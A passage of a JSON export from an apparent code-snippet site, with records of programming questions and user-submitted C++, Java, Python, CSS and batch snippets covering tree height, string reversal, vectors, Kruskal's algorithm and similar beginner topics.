    "description": "int height(Node* root) {     // Base case: empty tree has height 0     if (root == nullptr)         return 0;       // recur for left and right subtree and consider maximum depth     return 1 + max(height(root->left), height(root->right)); } \n// finding height of a binary tree in c++. int maxDepth(node* node)   {       if (node == NULL)           return 0;       else     {           /* compute the depth of each subtree */         int lDepth = maxDepth(node->left);           int rDepth = maxDepth(node->right);                  /* use the larger one */         if (lDepth > rDepth)               return(lDepth + 1);           else return(rDepth + 1);       }   }  \n# define a Class Tree, to intiate the binary tree class TreeNode:     def __init__(self, val):         self.val = val         self.left = None         self.right = None   def height(root):       # Check if the binary tree is empty     if root is None:         # If TRUE return 0         return 0      # Recursively call height of each node     leftAns = height(root.left)     rightAns = height(root.right)       # Return max(leftHeight, rightHeight) at each iteration     return max(leftAns, rightAns) + 1   # Test the algorithm root = TreeNode(1) root.left = TreeNode(2) root.right = TreeNode(3) root.left.left = TreeNode(4)   print(\"Height of the binary tree is: \" + str(height(root))) \n/*C++ Program for finding the height of the Binary tree */#include<iostream>using namespace std;/* A binary tree node has data, pointer to left child and a pointer to right child */struct Node{\tint data;\tNode* left;\tNode* right;\t/*For initilaizing the Node*/\tNode(int val)\t{\t\tdata=val;\t\tleft=NULL;\t\tright=NULL;\t}};//Recursive function for finding the Height of the Binary Treeint height(Node* rt){\tint lheight,rheight;\tif(rt==NULL) //If rt is NULL return 0\t\treturn 0;\telse\t{\t\tlheight = height(rt->left); //Left Subtree\t\trheight = height(rt->right); //Right Subtree\t\tif(lheight>rheight) //checking which is maximum (lheight or rheight) \t\t\treturn lheight+1;\t\telse\t\t\treturn rheight+1;\t}}/* DRIVER FUNCTION */int main(){\t/*Insert the Elements according to the Tree (Picture)*/\tNode* root = new Node(1);\troot->left = new Node(2);     root->right = new Node(3);     root->left->left = new Node(4);     root->left->right = new Node(5);    cout<<\"Height of the Binary Tree is \"<<height(root);\treturn 0;}\n",
    "reg_date": "2021-10-12T11:36:50.000Z"
  },
  {
    "id": 246,
    "keyword": null,
    "link": null,
    "title": " Hello world cpp",
    "description": "#include <iostream>   int main(){  std::cout <<\"Hello World\" << std::endl;  return 0; } \n#include<iostream> using namespace std;  int main(){     cout << \"Hello World\" << endl;      return 0; }\n// Your First C++ Program  #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; }\n// Your First C++ Program  #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; } \ncout << \"Hello World!\";\n// hello.cpp: Maggie Johnson // Description: a program that prints the immortal saying \"hello world\"  #include <iostream> using namespace std;  int main() {   cout << \"Hello World!\" << endl;   return 0; } \n",
    "reg_date": "2021-10-12T11:36:51.000Z"
  },
  {
    "id": 247,
    "keyword": null,
    "link": null,
    "title": " How To Calculate 1+1 in c++",
    "description": "#include <iostream> using namespace std; int i1 = 1; int i2 = 1; int main() { \ti1 = i1 + i2; \tcout<<i1<<endl; }\n",
    "reg_date": "2021-10-12T11:36:51.000Z"
  },
  {
    "id": 248,
    "keyword": null,
    "link": null,
    "title": " How do you initialize a private static data member in C++?",
    "description": "#include <iostream>  using namespace std;  class MyClass{    private:       static int st_var;    public:       MyClass(){          st_var++; //increase the value of st_var when new object is created       }       static int getStaticVar() {          return st_var;       } };  // don't forget the type of the variable you want to initialize int MyClass::st_var = 0; //initializing the static int  main() {    MyClass ob1, ob2, ob3; //three objects are created    cout << \"Number of objects: \" << MyClass::getStaticVar(); }\n",
    "reg_date": "2021-10-12T11:36:51.000Z"
  },
  {
    "id": 249,
    "keyword": null,
    "link": null,
    "title": " How to block window resize sfml c++",
    "description": "sf::RenderWindow wn(sf::VideoMode(620.f, 620.f),\"Lvl Editor\",sf::Style::Close);  //sf::Style::Close only allows the window to close and minimize and doesn't allows it to resize\n",
    "reg_date": "2021-10-12T11:36:51.000Z"
  },
  {
    "id": 250,
    "keyword": null,
    "link": null,
    "title": " How to create an ArrayList",
    "description": "ArrayList<Integer> integerArray = new ArrayList<Integer>(); ArrayList<String> integerArray = new ArrayList<String>(); ArrayList<Double> integerArray = new ArrayList<Double>(); //... keep replacing what is inside the <> with the appropriate //data type \nArrayList<Integer> [] myList = (ArrayList<Integer>[]) new ArrayList[4];\nList<String> words = new ArrayList<String>();\nimport java.util.ArrayList; public class ArrayListExample {    public static void main(String[] args)    {       int num = 14;       // declaring ArrayList with initial size num       ArrayList<Integer> al = new ArrayList<Integer>(num);       // append new element at the end of list       for(int a = 1; a <= num; a++)       {          al.add(a);       }       System.out.println(al);       // remove element at index 7       al.remove(7);       // print ArrayList after deletion       System.out.println(al);       // print elements one by one       for(int a = 0; a < al.size(); a++)       {          System.out.print(al.get(a) + \" \");       }    } }\nimport java.util.*;   class JavaExample{      public static void main(String args[]){         ArrayList<String> alist=new ArrayList<String>();         alist.add(\"Steve\");       alist.add(\"Tim\");       alist.add(\"Lucy\");       alist.add(\"Pat\");       alist.add(\"Angela\");       alist.add(\"Tom\");          //displaying elements       System.out.println(alist);          //Adding \"Steve\" at the fourth position       alist.add(3, \"Steve\");          //displaying elements       System.out.println(alist);    }   }\nArrayList<Integer> list=new ArrayList<Integer>();\n",
    "reg_date": "2021-10-12T11:36:51.000Z"
  },
  {
    "id": 251,
    "keyword": null,
    "link": null,
    "title": " How to find the individual letters of a string c++",
    "description": "string letters = \"ABC\"; char letterN = letters[0];\n",
    "reg_date": "2021-10-12T11:36:51.000Z"
  },
  {
    "id": 252,
    "keyword": null,
    "link": null,
    "title": " How to find the suarray with maximum sum using divide and conquer",
    "description": "#include <stdio.h> #include <limits.h>   // Utility function to find maximum of two numbers int max(int x, int y) {     return (x > y) ? x : y; }   // Function to find maximum subarray sum using divide and conquer int maximum_sum(int A[], int low, int high) {     // If array contains only one element     if (high == low)         return A[low];       // Find middle element of the array     int mid = (low + high) / 2;       // Find maximum subarray sum for the left subarray     // including the middle element     int left_max = INT_MIN;     int sum = 0;     for (int i = mid; i >= low; i--)     {         sum += A[i];         if (sum > left_max)             left_max = sum;     }       // Find maximum subarray sum for the right subarray     // excluding the middle element     int right_max = INT_MIN;     sum = 0;    // reset sum to 0     for (int i = mid + 1; i <= high; i++)     {         sum += A[i];         if (sum > right_max)             right_max = sum;     }       // Recursively find the maximum subarray sum for left subarray     // and right subarray and take maximum     int max_left_right = max(maximum_sum(A, low, mid),                             maximum_sum(A, mid + 1, high));       // return maximum of the three     return max(max_left_right, left_max + right_max); }   // Maximum Sum Subarray using Divide & Conquer int main(void) {     int arr[] = { 2, -4, 1, 9, -6, 7, -3 };     int n = sizeof(arr) / sizeof(arr[0]);       printf(\"The maximum sum of the subarray is %d\",              maximum_sum(arr, 0, n - 1));       return 0; } \n",
    "reg_date": "2021-10-12T11:36:51.000Z"
  },
  {
    "id": 253,
    "keyword": null,
    "link": null,
    "title": " How to get cursor position c++",
    "description": "POINT p; if (GetCursorPos(&p)) {     //cursor position now in p.x and p.y }\n",
    "reg_date": "2021-10-12T11:36:51.000Z"
  },
  {
    "id": 254,
    "keyword": null,
    "link": null,
    "title": " How to get the last element of an array in C++ using std::array",
    "description": "#include <array> std::array<int, 5> a {1, 2, 3, 4, 5}; int i = a[a.size() - 1]; // The last variable stored in i\n",
    "reg_date": "2021-10-12T11:36:51.000Z"
  },
  {
    "id": 255,
    "keyword": null,
    "link": null,
    "title": " How to make a function in C++",
    "description": "// function example #include <iostream> using namespace std;  int addition (int a, int b) {   int r;   r=a+b;   return r; }\n#include <iostream>  using namespace std;  void function(){     cout << \"I am a function!\" << endl; }  int main() {     function();      return 0; }\nvoid Hello() {   std::cout << \"Hello\"; }  int main () {   Hello(); }\n//first lets create a function /*void is for starting something, anything after void will be the name of your function which will be followed by () */ void yourFunction() { //your code will be here, anything here will be the code in the yourFunction   cout << \"Functions\" } //now we have to go to our main function, the only function the compiler reads int main() {   myFunction(); //you call the function, the code we put in it earlier will be executed   return 0; }\n// function returning the max between two numbers   int max(int num1, int num2) {    // local variable declaration    int result;      if (num1 > num2)       result = num1;    else       result = num2;      return result;  } \n#include <iostream> #include <stdlib.h> #include <iomanip> #include <fstream> using namespace std;  void function_one(double, double, double);  int main() {   double r1 = 1.0;   double r2 = 2.0;   double x = 0.0;   function_one(r1, r2, x);   return 0; }  void function_one(double rmin, double rmax, double x0) {   cout << \"Function got called\" << endl; }\n",
    "reg_date": "2021-10-12T11:36:52.000Z"
  },
  {
    "id": 256,
    "keyword": null,
    "link": null,
    "title": " How to pause a c++ program.",
    "description": "#include <Windows.h>  int main() { \t//do stuff \tsystem(\"Pause\"); }\n//On windows. #include<windows.h> Sleep(milliseconds);  //On linux. #include<unistd.h> unsigned int microsecond = 1000000; usleep(3 * microsecond);//sleeps for 3 second  // c++ 11 for high resulution.  #include <chrono> #include <thread>  int main() {     using namespace std::this_thread; // sleep_for, sleep_until     using namespace std::chrono; // nanoseconds, system_clock, seconds      sleep_for(nanoseconds(10));     // or      sleep_until(system_clock::now() + seconds(1)); }  // C++ 14 for high resuluton.  #include <chrono> #include <thread>  int main() {     using namespace std::this_thread;     // sleep_for, sleep_until     using namespace std::chrono_literals; // ns, us, ms, s, h, etc.     using std::chrono::system_clock;      sleep_for(10ns);   \t// or     sleep_until(system_clock::now() + 1s); }\n",
    "reg_date": "2021-10-12T11:36:52.000Z"
  },
  {
    "id": 257,
    "keyword": null,
    "link": null,
    "title": " How to put a progress bar on a Status Bar c++ builder",
    "description": " Question and Answer Database  FAQ2293C.txt   How to put a progress bar on a Status Bar ... Category   :VCL Platform    :All Product    :C++Builder  3.x  Question: How Do I put a Proress bar on a status bar.  Answer: Here is an example:  This is the form:  object Form1: TForm1   Left = 191   Top = 108   Width = 226   Height = 140   Caption = 'Form1'   Font.Charset = DEFAULT_CHARSET   Font.Color = clWindowText   Font.Height = -11   Font.Name = 'MS Sans Serif'   Font.Style = []   OnCreate = FormCreate   PixelsPerInch = 96   TextHeight = 13   object StatusBar1: TStatusBar     Left = 0     Top = 94     Width = 218     Height = 19     Panels =      SimplePanel = False     OnResize = StatusBar1Resize   end   object Button1: TButton     Left = 18     Top = 30     Width = 75     Height = 25     Caption = 'Button1'     TabOrder = 1     OnClick = Button1Click   end end   //---------------------------------------------------------- This is unit1.cpp  //--------------------------------------------------------------------------- #include  #pragma hdrstop  #include \"Unit1.h\" //--------------------------------------------------------------------------- #pragma package(smart_init) #pragma resource \"*.dfm\" TForm1 *Form1; //--------------------------------------------------------------------------- __fastcall TForm1::TForm1(TComponent* Owner)   : TForm(Owner) { } //---------------------------------------------------------------------------  void __fastcall TForm1::FormCreate(TObject *Sender) {     ProgressBar = new TProgressBar ( StatusBar1 );     ProgressBar->Parent = StatusBar1;      ProgressBar->Position = 0;     ProgressBar->Visible = false; } //---------------------------------------------------------------------------  void __fastcall TForm1::StatusBar1Resize(TObject *Sender) {     int Size = StatusBar1->Width;     for ( int i = 1; i Panels->Count; i++ )       Size -= StatusBar1->Panels->Items[i]->Width;      //resize the first panel based on the form width     StatusBar1->Panels->Items[ 0 ]->Width = Size;     RECT Rect;     StatusBar1->Perform ( SB_GETRECT,  0,  (LPARAM)&Rect );      ProgressBar->Top = Rect.top;     ProgressBar->Left = Rect.left;     ProgressBar->Width = StatusBar1->Panels->Items [ 0 ]->Width;     ProgressBar->Height = Rect.bottom - Rect.top; } //--------------------------------------------------------------------------- void __fastcall TForm1::Button1Click(TObject *Sender) {   ProgressBar->Show();   ProgressBar->Position = 50;   } //---------------------------------------------------------------------------    Here is Unit1.h  //--------------------------------------------------------------------------- #ifndef Unit1H #define Unit1H //--------------------------------------------------------------------------- #include  #include  #include  #include  #include  //--------------------------------------------------------------------------- class TForm1 : public TForm { __published:\t// IDE-managed Components   TStatusBar *StatusBar1;   TButton *Button1;   void __fastcall FormCreate(TObject *Sender);   void __fastcall StatusBar1Resize(TObject *Sender);   void __fastcall Button1Click(TObject *Sender); private:\t// User declarations   TProgressBar *ProgressBar; public:\t\t// User declarations   __fastcall TForm1(TComponent* Owner); }; //--------------------------------------------------------------------------- extern PACKAGE TForm1 *Form1; //--------------------------------------------------------------------------- #endif     7/2/98 10:32:32 AM  \n",
    "reg_date": "2021-10-12T11:36:52.000Z"
  },
  {
    "id": 258,
    "keyword": null,
    "link": null,
    "title": " How to read a file in in C++",
    "description": "// io/read-file-sum.cpp - Read integers from file and print sum. // Fred Swartz 2003-08-20  #include <iostream> #include <iomanip> #include <fstream> using namespace std;  int main() {     int sum = 0;     int x;     ifstream inFile;          inFile.open(\"test.txt\");     if (!inFile) {         cout << \"Unable to open file\";         exit(1); // terminate with error     }          while (inFile >> x) {         sum = sum + x;     }          inFile.close();     cout << \"Sum = \" << sum << endl;      return 0; } \n",
    "reg_date": "2021-10-12T11:36:52.000Z"
  },
  {
    "id": 259,
    "keyword": null,
    "link": null,
    "title": " How to remove the % in zsh that show after running c++ file",
    "description": "put ` PROMPT_EOL_MARK='' ` into your .zshrc file to hide the difference between trailing newline or not on command output.\n",
    "reg_date": "2021-10-12T11:36:52.000Z"
  },
  {
    "id": 260,
    "keyword": null,
    "link": null,
    "title": " How to reverse a string in c++ using reverse function",
    "description": "#include <iostream> //The library below must be included for the reverse function to work #include<bits/stdc++.h>  using namespace std;  int main() {      string greeting = \"Hello\";   //Note that it takes the iterators to the start and end of the string as arguments   reverse(greeting.begin(),greeting.end());   cout<<greeting<<endl; }\n",
    "reg_date": "2021-10-12T11:36:52.000Z"
  },
  {
    "id": 261,
    "keyword": null,
    "link": null,
    "title": " How to reverse a string in c++ using while loop",
    "description": "#include <iostream> using namespace std;  int main() {     string greeting = \"Hello\";   int len = greeting.length();   int n = len-1;   int i = 0;   while(i<=n){     //Using the swap method to switch values at each index     swap(greeting[i],greeting[n]);     n = n-1;     i = i+1;    }   cout<<greeting<<endl; }\n",
    "reg_date": "2021-10-12T11:36:52.000Z"
  },
  {
    "id": 262,
    "keyword": null,
    "link": null,
    "title": " How to reverse a string in c++ with for loop",
    "description": "#include <iostream> using namespace std;  int main() {     string greeting = \"Hello\";   int len = greeting.length();   int n=len-1;   for(int i=0;i<(len/2);i++){     //Using the swap method to switch values at each index     swap(greeting[i],greeting[n]);     n = n-1;    }   cout<<greeting<<endl; }\n",
    "reg_date": "2021-10-12T11:36:52.000Z"
  },
  {
    "id": 263,
    "keyword": null,
    "link": null,
    "title": " How to turn an integer variable into a char c++",
    "description": "char aChar = '0' + i;\n",
    "reg_date": "2021-10-12T11:36:53.000Z"
  },
  {
    "id": 264,
    "keyword": null,
    "link": null,
    "title": " How to use char in C++",
    "description": "#include <iostream> using namespace std; int main() { \tchar grade = 'B'; \tcout << \"I scored a: \"<<grade; \treturn 0; } \nisdigit() - Check if character is decimal digit  isalpha() - Check if character is alphabetic isblank() - Check if character is blank islower() - Check if character is lowercase letter isupper() - Check if character is uppercase letter isalnum() - Check if character is alphanumeric\n// strings and NTCS: #include <iostream> #include <string> using namespace std;  int main () {   char question1[] = \"What is your name? \";   string question2 = \"Where do you live? \";   char answer1 [80];   string answer2;   cout << question1;   cin >> answer1;   cout << question2;   cin >> answer2;   cout << \"Hello, \" << answer1;   cout << \" from \" << answer2 << \"!\\n\";   return 0; }\n // syntax:  // char <variable-name>[] = { '<1st-char>',  '<2nd-char>', ... , '<Nth-char>', '\\0'};   // example (to store 'Hello' in the YourVar variable):  char YourVar[] = {'H','e','l','l','o','\\0'}; // NOTE: the \\0 marks the end of the char array \nString and Char\n",
    "reg_date": "2021-10-12T11:36:53.000Z"
  },
  {
    "id": 265,
    "keyword": null,
    "link": null,
    "title": " I need to write an int function in which there are only cout statements and if I return 0/1 it prints them too.",
    "description": "/*  * First C++ program that says hello (hello.cpp)  */ #include <iostream>    // Needed to perform IO operations using namespace std;   int main() {                        // Program entry point    cout << \"hello, world\" << endl;  // Say Hello    return 0;                        // Terminate main() }                                   // End of main function\n",
    "reg_date": "2021-10-12T11:36:53.000Z"
  },
  {
    "id": 266,
    "keyword": null,
    "link": null,
    "title": " If ERRORLEVEL",
    "description": "@echo off  set host=host_ip  set logfile=Ping_test.log set logfile_fail=Ping_test_fail.log  echo Target Host = %host% >%logfile% for /f \"tokens=*\" %%A in ('ping %host% -n 1') do (echo (%%A>>%logfile% && GOTO Ping)  :Ping for /f \"tokens=* skip=2\" %%A in ('ping %host% -n 1 ') do (     echo %date% %time:~0,2%:%time:~3,2%:%time:~6,2% %%A>>%logfile%     if not %errolevel% 0 do (echo %date% %time:~0,2%:%time:~3,2%:%time:~6,2% errorlvel %errorlevel% %%A>>%logfile_fail%)      echo %errorlevel% %date% %time:~0,2%:%time:~3,2%:%time:~6,2% %%A     timeout 1 >NUL      GOTO Ping ) \n:Ping for /f \"tokens=* skip=2\" %%A in ('ping %host% -n 1 ^& call echo %%^^errorlevel%%^>error.level') do (     set /p elv=<\"error.level\"      if not !elv!==0 (echo %date% %time:~0,2%:%time:~3,2%:%time:~6,2% %%A>>%logfile_fail%)     echo %date% %time:~0,2%:%time:~3,2%:%time:~6,2% %%A>>%logfile%     echo elv %elv% %date% %time:~0,2%:%time:~3,2%:%time:~6,2% %%A     timeout 1 >NUL      GOTO Ping ) \n",
    "reg_date": "2021-10-12T11:36:53.000Z"
  },
  {
    "id": 267,
    "keyword": null,
    "link": null,
    "title": " ImGui::Text(\"Made By Joker\");",
    "description": "ImGui::Text(\"Made By Joker\");\n",
    "reg_date": "2021-10-12T11:36:53.000Z"
  },
  {
    "id": 268,
    "keyword": null,
    "link": null,
    "title": " Implement two clique problem",
    "description": "// C++ program to find out whether a given graph can be  // converted to two Cliques or not.  #include <bits/stdc++.h>  using namespace std;     const int V = 5;     // This function returns true if subgraph reachable from  // src is Bipartite or not.  bool isBipartiteUtil(int G[][V], int src, int colorArr[])  {      colorArr[src] = 1;         // Create a queue (FIFO) of vertex numbers and enqueue      // source vertex for BFS traversal      queue <int> q;      q.push(src);         // Run while there are vertices in queue (Similar to BFS)      while (!q.empty())      {          // Dequeue a vertex from queue          int u = q.front();          q.pop();             // Find all non-colored adjacent vertices          for (int v = 0; v < V; ++v)          {              // An edge from u to v exists and destination              // v is not colored              if (G[u][v] && colorArr[v] == -1)              {                  // Assign alternate color to this adjacent                  // v of u                  colorArr[v] = 1 - colorArr[u];                  q.push(v);              }                 // An edge from u to v exists and destination              // v is colored with same color as u              else if (G[u][v] && colorArr[v] == colorArr[u])                  return false;          }      }         // If we reach here, then all adjacent vertices can      // be colored with alternate color      return true;  }     // Returns true if a Graph G[][] is Bipartite or not. Note  // that G may not be connected.  bool isBipartite(int G[][V])  {      // Create a color array to store colors assigned      // to all veritces. Vertex number is used as index in      // this array. The value '-1' of  colorArr[i]      // is used to indicate that no color is assigned to      // vertex 'i'.  The value 1 is used to indicate first      // color is assigned and value 0 indicates      // second color is assigned.      int colorArr[V];      for (int i = 0; i < V; ++i)          colorArr[i] = -1;         // One by one check all not yet colored vertices.      for (int i = 0; i < V; i++)          if (colorArr[i] == -1)              if (isBipartiteUtil(G, i, colorArr) == false)                  return false;         return true;  }     // Returns true if G can be divided into  // two Cliques, else false.  bool canBeDividedinTwoCliques(int G[][V])  {      // Find complement of G[][]      // All values are complemented except      // diagonal ones      int GC[V][V];      for (int i=0; i<V; i++)          for (int j=0; j<V; j++)               GC[i][j] = (i != j)?  !G[i][j] : 0;         // Return true if complement is Bipartite      // else false.      return  isBipartite(GC);  }     // Driver program to test above function  int main()  {      int G[][V] = {{0, 1, 1, 1, 0},          {1, 0, 1, 0, 0},          {1, 1, 0, 0, 0},          {0, 1, 0, 0, 1},          {0, 0, 0, 1, 0}      };         canBeDividedinTwoCliques(G) ? cout << \"Yes\" :                                    cout << \"No\";      return 0;  }  \n",
    "reg_date": "2021-10-12T11:36:53.000Z"
  },
  {
    "id": 269,
    "keyword": null,
    "link": null,
    "title": " Implementation of Extended Euclidian theorem",
    "description": "int gcd(int a, int b, int& x, int& y) {     if (b == 0) {         x = 1;         y = 0;         return a;     }     int x1, y1;     int d = gcd(b, a % b, x1, y1);     x = y1;     y = x1 - y1 * (a / b);     return d; } \n",
    "reg_date": "2021-10-12T11:36:53.000Z"
  },
  {
    "id": 270,
    "keyword": null,
    "link": null,
    "title": " ImportError: cannot import name 'TFLiteConverter' from 'tensorflow.lite'",
    "description": "from tensorflow import lite  converter = lite.TFLiteConverter.from_saved_model('/drive/My Drive/FSD_modelV09A.h5') tflite_model = converter.convert() open(\"/drive/My Drive/FSD_modelV09A.tflite\", \"wb\").write(tflite_model) \n",
    "reg_date": "2021-10-12T11:36:53.000Z"
  },
  {
    "id": 271,
    "keyword": null,
    "link": null,
    "title": " Imports the elements in the array c++",
    "description": "for (auto &i : a) { \t\t\tcin >> i; \t\t} \n",
    "reg_date": "2021-10-12T11:36:53.000Z"
  },
  {
    "id": 272,
    "keyword": null,
    "link": null,
    "title": " In every C++ program:",
    "description": "// Sololearn ??  There must be a function named main. Each variable must have its data type\n",
    "reg_date": "2021-10-12T11:36:53.000Z"
  },
  {
    "id": 273,
    "keyword": null,
    "link": null,
    "title": " Inline Functions In C++",
    "description": "#include <iostream>   using namespace std;  inline int Max(int x, int y) {    return (x > y)? x : y; }  // Main function for the program int main() {    cout << \"Max (20,10): \" << Max(20,10) << endl;    cout << \"Max (0,200): \" << Max(0,200) << endl;    cout << \"Max (100,1010): \" << Max(100,1010) << endl;        return 0; }\n#include <iostream> using namespace std; inline int cube(int s) {     return s*s*s; } int main() {     cout << \"The cube of 3 is: \" << cube(3) << \"\\n\";     return 0; } //Output: The cube of 3 is: 27 \nInline Member Functions (C++) A member function that is both declared and defined in the class member list is called an inline member function. Member functions containing a few lines of code are usually declared inline. \n",
    "reg_date": "2021-10-12T11:36:54.000Z"
  },
  {
    "id": 274,
    "keyword": null,
    "link": null,
    "title": " Inner Section Sticky Scroll in elementor",
    "description": ".titlesticky{ position: sticky; position: -webkit-sticky; top: 3rem; } .parent-sticky  .elementor-widget-wrap { display: block!important;  } \n",
    "reg_date": "2021-10-12T11:36:54.000Z"
  },
  {
    "id": 275,
    "keyword": null,
    "link": null,
    "title": " Insert into vector C++",
    "description": "// CPP program to create an empty vector  // and push values one by one.  #include <vector>  using namespace std; int main()  {      // Create an empty vector      vector<int> vect;       //add/push an integer to the end of the vector     vect.push_back(10);  \t//to traverse and print the vector from start to finish     for (int x : vect)          cout << x << \" \";      return 0;  }\n// where v is the vector to insert, i is // the position, and value is the value  v.insert(v.begin() + i, v2[i])\nvector_name.push_back(element_to_be_added);\n// vector::push_back #include <iostream> #include <vector>  int main () {   std::vector<int> myvector;   int myint;    std::cout << \"Please enter some integers (enter 0 to end):\\n\";    do {     std::cin >> myint;     myvector.push_back (myint);   } while (myint);    std::cout << \"myvector stores \" << int(myvector.size()) << \" numbers.\\n\";    return 0; }\n// inserting into a vector #include <iostream> #include <vector>  int main () {   std::vector<int> myvector (3,100);   std::vector<int>::iterator it;    it = myvector.begin();   it = myvector.insert ( it , 200 );    myvector.insert (it,2,300);    // \"it\" no longer valid, get a new one:   it = myvector.begin();    std::vector<int> anothervector (2,400);   myvector.insert (it+2,anothervector.begin(),anothervector.end());    int myarray [] = { 501,502,503 };   myvector.insert (myvector.begin(), myarray, myarray+3);    std::cout << \"myvector contains:\";   for (it=myvector.begin(); it<myvector.end(); it++)     std::cout << ' ' << *it;   std::cout << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:36:54.000Z"
  },
  {
    "id": 276,
    "keyword": null,
    "link": null,
    "title": " InstallUtil.exe ConsoleApp",
    "description": "SC create YourServiceName start= auto binPath= \"path/to/your/exe\" DisplayName= \"Your Display Name\" \n",
    "reg_date": "2021-10-12T11:36:54.000Z"
  },
  {
    "id": 277,
    "keyword": null,
    "link": null,
    "title": " Iterator in c++",
    "description": "// string::begin/end #include <iostream> #include <string>  int main () {   std::string str (\"Test string\");   for ( std::string::iterator it=str.begin(); it!=str.end(); ++it)     std::cout << *it << endl;   std::cout << '\\n';    return 0; }\n//Iterator Pointer like Structore in c++ of STL #include <bits/stdc++.h> using namespace std;  int main(){     vector<int> v = {1,2,3,4,5};     for(int i = 0; i<v.size(); i++){         cout<<v[i]<<\" \";     }     cout<<endl;      vector<int> :: iterator it;     // it = v.begin();     // cout<<(*it+1)<<endl;      for(it = v.begin(); it !=v.end(); ++it){         cout<<(*it)<<endl;     }     cout<<endl;      vector<pair<int, int>> v_p = {{1,2},{3,4},{5,6}};     vector<pair<int ,int>> :: iterator iter;     for(iter = v_p.begin(); iter !=v_p.end(); ++iter){         cout<<(*iter).first<<\" \"<<(*iter).second<<endl;     }     cout<<endl;     for(iter = v_p.begin(); iter !=v_p.end(); ++iter){         cout<<(iter->first)<<\" \"<<(iter->second)<<endl;     }      return 0; }\n#include <tuple> #include <iostream> #include <boost/hana.hpp> #include <boost/hana/ext/std/tuple.hpp>  struct Foo1 {     int foo() const { return 42; } };  struct Foo2 {     int bar = 0;     int foo() { bar = 24; return bar; } };  int main() {     using namespace std;     using boost::hana::for_each;      Foo1 foo1;     Foo2 foo2;      for_each(tie(foo1, foo2), [](auto &foo) {         cout << foo.foo() << endl;     });      cout << \"foo2.bar after mutation: \" << foo2.bar << endl; } \nvector<int>::iterator ptr; \n",
    "reg_date": "2021-10-12T11:36:54.000Z"
  },
  {
    "id": 278,
    "keyword": null,
    "link": null,
    "title": " JAJA",
    "description": "                           \n                    JAJAJ xd                 \njaja                  \n",
    "reg_date": "2021-10-12T11:36:54.000Z"
  },
  {
    "id": 279,
    "keyword": null,
    "link": null,
    "title": " Job Sequence Algorithm in C++",
    "description": "// Program to find the maximum profit job sequence from a given array  // of jobs with deadlines and profits  #include<iostream>  #include<algorithm>  using namespace std;     // A structure to represent a job  struct Job  {     char id;      // Job Id     int dead;    // Deadline of job     int profit;  // Profit if job is over before or on deadline  };     // This function is used for sorting all jobs according to profit  bool comparison(Job a, Job b)  {       return (a.profit > b.profit);  }     // Returns minimum number of platforms reqquired  void printJobScheduling(Job arr[], int n)  {      // Sort all jobs according to decreasing order of prfit      sort(arr, arr+n, comparison);         int result[n]; // To store result (Sequence of jobs)      bool slot[n];  // To keep track of free time slots         // Initialize all slots to be free      for (int i=0; i<n; i++)          slot[i] = false;         // Iterate through all given jobs      for (int i=0; i<n; i++)      {         // Find a free slot for this job (Note that we start         // from the last possible slot)         for (int j=min(n, arr[i].dead)-1; j>=0; j--)         {            // Free slot found            if (slot[j]==false)            {               result[j] = i;  // Add this job to result               slot[j] = true; // Make this slot occupied               break;            }         }      }         // Print the result      for (int i=0; i<n; i++)         if (slot[i])           cout << arr[result[i]].id << \" \";  }     // Driver program to test methods  int main()  {      Job arr[] = { {'a', 2, 100}, {'b', 1, 19}, {'c', 2, 27},                     {'d', 1, 25}, {'e', 3, 15}};      int n = sizeof(arr)/sizeof(arr[0]);      cout << \"Following is maximum profit sequence of jobsn\";      printJobScheduling(arr, n);      return 0;  }  \n",
    "reg_date": "2021-10-12T11:36:54.000Z"
  },
  {
    "id": 280,
    "keyword": null,
    "link": null,
    "title": " KUNG FU HUSTLE",
    "description": "Good Movie\n",
    "reg_date": "2021-10-12T11:36:55.000Z"
  },
  {
    "id": 281,
    "keyword": null,
    "link": null,
    "title": " Kruskals in c++",
    "description": "#include<bits/stdc++.h>  using namespace std;      typedef  pair<int, int> iPair;      struct Graph  {      int V, E;      vector< pair<int, iPair> > edges;             Graph(int V, int E)      {          this->V = V;          this->E = E;      }         void addEdge(int u, int v, int w)      {          edges.push_back({w, {u, v}});      }           int kruskalMST();  };      struct DisjointSets  {      int *parent, *rnk;      int n;          DisjointSets(int n)      {               this->n = n;          parent = new int[n+1];          rnk = new int[n+1];                  for (int i = 0; i <= n; i++)          {              rnk[i] = 0;                        parent[i] = i;          }      }        int find(int u)      {                if (u != parent[u])              parent[u] = find(parent[u]);          return parent[u];      }           void merge(int x, int y)      {          x = find(x), y = find(y);                     if (rnk[x] > rnk[y])              parent[y] = x;          else              parent[x] = y;             if (rnk[x] == rnk[y])              rnk[y]++;      }  };         int Graph::kruskalMST()  {      int mst_wt = 0;         sort(edges.begin(), edges.end());          DisjointSets ds(V);          vector< pair<int, iPair> >::iterator it;      for (it=edges.begin(); it!=edges.end(); it++)      {          int u = it->second.first;          int v = it->second.second;             int set_u = ds.find(u);          int set_v = ds.find(v);                    if (set_u != set_v)          {                         cout << u << \" - \" << v << endl;                        mst_wt += it->first;                          ds.merge(set_u, set_v);          }      }         return mst_wt;  }      int main()  {          int V = 9, E = 14;      Graph g(V, E);             g.addEdge(0, 1, 4);      g.addEdge(0, 7, 8);      g.addEdge(1, 2, 8);      g.addEdge(1, 7, 11);      g.addEdge(2, 3, 7);      g.addEdge(2, 8, 2);      g.addEdge(2, 5, 4);      g.addEdge(3, 4, 9);      g.addEdge(3, 5, 14);      g.addEdge(4, 5, 10);      g.addEdge(5, 6, 2);      g.addEdge(6, 7, 1);      g.addEdge(6, 8, 6);      g.addEdge(7, 8, 7);         cout << \"Edges of MST are \\n\";      int mst_wt = g.kruskalMST();         cout << \"\\nWeight of MST is \" << mst_wt;         return 0;  } \n",
    "reg_date": "2021-10-12T11:36:55.000Z"
  },
  {
    "id": 282,
    "keyword": null,
    "link": null,
    "title": " LIS C++ DP",
    "description": "#include <bits/stdc++.h>using namespace std; int main() {  int n;  cin >> n;  vector<int> dp;  for (int i = 0; i < n; i++) {    int x;    cin >> x;    auto it = lower_bound(dp.begin(), dp.end(), x);    if (it == dp.end()) {      dp.push_back(x);    } else {      *it = x;    }  }  cout << dp.size() << endl;}\n",
    "reg_date": "2021-10-12T11:36:55.000Z"
  },
  {
    "id": 283,
    "keyword": null,
    "link": null,
    "title": " Lambda capture as const cpp",
